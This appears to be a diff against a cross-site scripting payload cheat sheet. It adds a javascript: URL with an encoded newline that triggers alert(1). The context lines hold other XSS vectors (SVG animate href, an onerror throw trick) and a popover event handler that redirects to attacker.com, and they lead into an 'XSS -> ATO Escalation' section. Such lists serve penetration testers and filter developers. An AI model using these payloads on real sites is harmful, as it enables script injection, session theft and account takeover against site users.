@@ -856,6 +856,7 @@ ${alert(1)}
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
 '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 <button popovertarget=x>CLICKME</button><input type="text" readonly="readonly" id="x" popover onbeforetoggle=window.location.replace('http:attacker.com') />
+javascript://redacted.com%0aalert(1)
 ```
 
 ### XSS -> ATO Escalation [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
